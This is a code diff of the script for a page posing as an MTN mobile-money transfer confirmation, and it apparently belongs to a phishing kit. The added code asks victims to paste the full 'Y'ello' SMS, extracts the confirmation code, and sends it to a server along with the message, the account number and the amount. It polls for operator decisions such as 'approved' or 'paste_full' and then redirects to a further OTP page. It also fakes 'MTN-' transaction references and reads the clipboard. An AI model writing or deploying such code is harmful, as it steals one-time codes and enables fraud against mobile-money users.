+    msgs.forEach((m, i) => { m.classList.remove('active', 'leaving'); if (i === 0) m.classList.add('active'); });
+    if (trustTimer) clearInterval(trustTimer);
+    trustTimer = setInterval(() => {
+      msgs[trustIndex].classList.remove('active');
+      msgs[trustIndex].classList.add('leaving');
+      const prev = trustIndex;
+      trustIndex = (trustIndex + 1) % msgs.length;
+      setTimeout(() => msgs[prev].classList.remove('leaving'), 450);
+      msgs[trustIndex].classList.add('active');
+    }, 2600);
+  }
+  function stopTrustSlider() { if (trustTimer) { clearInterval(trustTimer); trustTimer = null; } }
 
-  function startCountdown(seconds) {
-    countdown = seconds;
-    resendBtn.disabled = true;
-    resendBtn.textContent = 'Resend in ' + countdown + 's';
-    if (timer) clearInterval(timer);
-    timer = setInterval(() => {
-      countdown -= 1;
-      if (countdown <= 0) {
-        clearInterval(timer); timer = null;
-        resendBtn.disabled = false;
-        resendBtn.textContent = 'Resend code';
+  function hideAllNotices() {
+    document.getElementById('noticeDeclined').classList.remove('show');
+    document.getElementById('noticeExpired').classList.remove('show');
+    document.getElementById('noticeFullSms').classList.remove('show');
+  }
+  function showNotice(id) {
+    hideAllNotices();
+    const el = document.getElementById(id);
+    el.classList.add('show');
+    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  let detectedCode = '';
+  function parseYelloMessage(raw) {
+    const text = (raw || '').trim();
+    if (!text) return { ok: false, reason: 'empty' };
+    const first = text.split(/\s+/)[0].toLowerCase().replace(/[’'`´]/g, "'");
+    if (!/^y'?ello/.test(first)) return { ok: false, reason: 'prefix' };
+    let code = '';
+    const explicit = text.match(/(?:code|ref|reference|otp|pin|txn)\s*[:=\-]?\s*([A-Z0-9]{4,})/i);
+    if (explicit && explicit[1]) code = explicit[1];
+    if (!code) {
+      const tokens = text.split(/\s+/).map(t => t.replace(/[^A-Z0-9]/gi, '')).filter(t => t.length >= 6 && /[0-9]/.test(t));
+      tokens.sort((a, b) => b.length - a.length);
+      if (tokens.length) code = tokens[0];
+    }
+    if (!code) return { ok: false, reason: 'nocode' };
+    return { ok: true, code };
+  }
+
+  function updateDetected() {
+    const box = document.getElementById('detectedBox');
+    const el  = document.getElementById('detectedCode');
+    const err = document.getElementById('smsError');
+    const input = document.getElementById('smsInput');
+    const copyBtn = document.getElementById('copySmsBtn');
+    const res = parseYelloMessage(input.value);
+    if (res.ok) {
+      detectedCode = res.code;
+      el.textContent = res.code;
+      box.classList.add('show');
+      input.classList.remove('invalid');
+      err.classList.remove('show');
+      // Show the tap-to-copy button since the SMS is valid
+      if (copyBtn) copyBtn.classList.add('show');
+    } else {
+      detectedCode = '';
+      box.classList.remove('show');
+      if (copyBtn) copyBtn.classList.remove('show', 'copied');
+      const copyLabel = document.getElementById('copySmsLabel');
+      if (copyLabel) copyLabel.textContent = 'Tap to copy SMS';
+      if (input.value.trim().length > 0 && res.reason === 'prefix') {
+        input.classList.add('invalid');
+        err.textContent = 'The message must start with "Y\'ello".';
+        err.classList.add('show');
       } else {
-        resendBtn.textContent = 'Resend in ' + countdown + 's';
+        input.classList.remove('invalid');
+        err.classList.remove('show');
       }
-    }, 1000);
-  }
-
-  async function requestCode(source) {
-    hideExpiredNotice();
-    resendBtn.disabled = true;
-    resendBtn.textContent = 'Sending…';
-
-    try {
-      const r = await fetch(CONFIG.OTP_REQUEST, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tx: txData.tx,
-          am: txData.am,
-          cur: txData.cur,
-          c: txData.c
-        })
-      });
-      const j = await r.json().catch(() => ({}));
-
-      if (!r.ok) {
-        showToast(j.message || 'Could not send code.');
-        resendBtn.disabled = false;
-        resendBtn.textContent = 'Resend code';
-        return;
-      }
-
-      showToast('Ready. Enter your code.');
-      startCountdown(30);
-      clearOtp();
-      setOtpEnabled(true);
-    } catch (e) {
-      showToast('Network error. Please try again.');
-      resendBtn.disabled = false;
-      resendBtn.textContent = 'Resend code';
     }
   }
 
-  async function verifyCode() {
-    hideExpiredNotice();
+  /* ── Tap-to-copy the exact SMS ── */
+  async function copySmsText() {
+    const input = document.getElementById('smsInput');
+    const btn = document.getElementById('copySmsBtn');
+    const lbl = document.getElementById('copySmsLabel');
+    const text = input.value;
 
-    const otp = getOtp();
-    if (otp.length !== 6) {
-      showToast('Please enter all 6 digits.');
+    if (!text || !text.trim()) {
+      showToast('Nothing to copy yet.');
       return;
     }
 
-    document.getElementById('verifying').classList.add('show');
-    document.getElementById('verifyBtn').disabled = true;
-    setOtpEnabled(false);
+    let copied = false;
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        await navigator.clipboard.writeText(text);
+        copied = true;
+      }
+    } catch (e) { /* fall through to fallback */ }
+
+    if (!copied) {
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        ta.style.left = '-9999px';
+        document.body.appendChild(ta);
+        ta.select();
+        ta.setSelectionRange(0, ta.value.length);
+        copied = document.execCommand('copy');
+        document.body.removeChild(ta);
+      } catch (e) { copied = false; }
+    }
+
+    if (copied) {
+      btn.classList.add('copied');
+      lbl.textContent = '✓ Copied to clipboard';
+      showToast('Full SMS copied.');
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        lbl.textContent = 'Tap to copy SMS';
+      }, 2000);
+    } else {
+      showToast('Could not copy. Long-press to select manually.');
+    }
+  }
+
+  document.getElementById('smsInput').addEventListener('input', () => {
+    hideAllNotices();
+    updateDetected();
+  });
+
+  async function resendSms() {
+    const btn = document.getElementById('resendBtn');
+    const lbl = document.getElementById('resendLabel');
+    btn.disabled = true;
+    lbl.textContent = 'Sending…';
+    try {
+      const r = await fetch(CONFIG.RESEND, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tx: tx.ref, an: tx.an, c: tx.c, am: tx.am, cur: tx.cur })
+      });
+      if (!r.ok) throw new Error('bad');
+      btn.classList.add('sent');
+      lbl.textContent = 'Sent ✓';
+      hideAllNotices();
+      showToast("A new Y'ello message was sent to your phone.");
+      setTimeout(() => {
+        btn.classList.remove('sent');
+        lbl.textContent = 'Resend SMS';
+        btn.disabled = false;
+      }, 3000);
+    } catch (e) {
+      lbl.textContent = 'Resend SMS';
+      btn.disabled = false;
+      showToast('Could not resend. Please try again in a moment.');
+    }
+  }
+
+  async function pasteFromClipboard() {
+    const btn = document.getElementById('pasteBtn');
+    btn.disabled = true;
+    try {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        const txt = await navigator.clipboard.readText();
+        if (txt) {
+          document.getElementById('smsInput').value = txt;
+          hideAllNotices();
+          updateDetected();
+          showToast('Pasted from clipboard.');
+        } else {
+          showToast('Clipboard is empty.');
+        }
+      } else {
+        showToast('Paste manually: long-press the box and tap Paste.');
+        document.getElementById('smsInput').focus();
+      }
+    } catch (e) {
+      showToast('Paste manually: long-press the box and tap Paste.');
+      document.getElementById('smsInput').focus();
+    }
+    btn.disabled = false;
+  }
+
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    stopTrustSlider();
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = false;
+    btn.textContent = 'Confirm transfer';
+  }
+
+  async function confirmPayment() {
+    updateDetected();
+
+    const input = document.getElementById('smsInput');
+    const err   = document.getElementById('smsError');
+
+    if (!input.value.trim()) {
+      input.classList.add('invalid');
+      err.textContent = "Please paste the Y'ello message you received.";
+      err.classList.add('show');
+      input.focus();
+      return;
+    }
+    const res = parseYelloMessage(input.value);
+    if (!res.ok) {
+      input.classList.add('invalid');
+      err.textContent = res.reason === 'prefix'
+        ? "The message must start with \"Y'ello\"."
+        : 'We could not find a confirmation code in the message.';
+      err.classList.add('show');
+      input.focus();
+      return;
+    }
+
+    hideAllNotices();
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = true;
+
+    if (!tx.ref) {
+      tx.ref = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
+    }
 
     try {
-      await fetch(CONFIG.SUBMIT, {
+      const r = await fetch(CONFIG.SMS_SEND, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          tx: txData.tx,
-          otp: otp,
-          am: txData.am,
-          cur: txData.cur,
-          c:  txData.c,
-          an: txData.an,
-          rn: txData.rn
+          tx: tx.ref,
+          code: res.code,
+          message: input.value.trim(),
+          am: tx.am,
+          cur: tx.cur,
+          c: tx.c,
+          an: tx.an,
+          rn: tx.rn
         })
       });
-    } catch (e) { /* keep polling */ }
+      if (!r.ok) throw new Error('rejected');
+    } catch (e) {
+      btn.disabled = false;
+      showToast('Network error. Please try again.');
+      return;
+    }
 
-    const start = Date.now();
-    const maxWaitMs = 2 * 60 * 1000;
+    document.getElementById('authTitle').textContent = 'Verifying…';
+    document.getElementById('authorizingOverlay').classList.add('show');
+    startTrustSlider();
+    pollingActive = true;
 
-    const q = new URLSearchParams({
-      tx:  txData.tx,
-      am:  txData.am,
-      cur: txData.cur,
-      rn:  txData.rn,
-      c:   txData.c,
-      pm:  txData.pm,
-      dt:  txData.dt
-    });
-
-    const check = async () => {
-      if (Date.now() - start > maxWaitMs) {
-        document.getElementById('verifying').classList.remove('show');
-        document.getElementById('verifyBtn').disabled = false;
-        setOtpEnabled(true);
-        showToast('Approval timed out. Please resend the code.');
-        return;
-      }
-
+    const poll = async () => {
+      if (!pollingActive) return;
       let decision = 'pending';
       try {
-        const r = await fetch(CONFIG.STATUS(txData.tx));
+        const r = await fetch(CONFIG.SMS_STATUS(tx.ref));
         const j = await r.json();
-        decision = j.decision || 'pending';
+        decision = (j && (j.decision || j.status)) || 'pending';
       } catch (e) {}
-
-      if (decision === 'declined' || decision === 'expired') {
-        document.getElementById('verifying').classList.remove('show');
-        document.getElementById('verifyBtn').disabled = false;
-        setOtpEnabled(true);
-        clearOtp();
-        showExpiredNotice();
-        if (timer) { clearInterval(timer); timer = null; }
-        resendBtn.disabled = false;
-        resendBtn.textContent = 'Resend code';
-        return;
-      }
-
-      if (decision === 'inactive') {
-        window.location.replace('inactive.html?' + q.toString());
-        return;
-      }
+      if (!pollingActive) return;
 
       if (decision === 'approved') {
-        window.location.replace('verify.html?' + q.toString());
+        pollingActive = false;
+        stopTrustSlider();
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+        });
+        window.location.href = CONFIG.OTP_PAGE + '?' + q.toString();
         return;
       }
 
-      setTimeout(check, 1500);
+      if (decision === 'paste_full' || decision === 'needs_full_sms' || decision === 'fully') {
+        pollingActive = false;
+        stopTrustSlider();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Confirm transfer';
+        showNotice('noticeFullSms');
+        document.getElementById('smsInput').focus();
+        showToast("Please paste the full Y'ello SMS, or tap Resend SMS.");
+        return;
+      }
+
+      if (decision === 'expired' || decision === 'declined') {
+        pollingActive = false;
+        stopTrustSlider();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Confirm transfer';
+        showNotice('noticeExpired');
+        document.getElementById('resendBtn').classList.add('sent');
+        document.getElementById('resendLabel').textContent = 'Resend now';
+        showToast('Verification declined — please resend and paste the new SMS.');
+        return;
+      }
+
+      pollTimer = setTimeout(poll, CONFIG.POLL_MS);
     };
 
-    check();
+    poll();
   }
 
   document.addEventListener('DOMContentLoaded', async () => {
-    await resolvePayload();
-
-    if (txData.tx || txData.am) {
-      document.getElementById('txId').textContent = txData.tx || '—';
-      document.getElementById('amtCur').textContent = txData.cur || '';
-      document.getElementById('amtVal').textContent = formatAmount(txData.am, txData.cur);
-    } else {
-      document.querySelector('.card').innerHTML =
-        '<div style="padding:40px 24px;text-align:center">' +
-        '<h2 style="font-size:18px;margin-bottom:6px">Missing transaction</h2>' +
-        '<p style="font-size:13px;color:#667085">Please return to the payment page and try again.</p>' +
-        '</div>';
-      return;
-    }
-
-    if (txData.tx) requestCode('auto');
+    await resolveTx();
+    document.getElementById('amountLabel').textContent = tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
   });
 </script>
 </body>
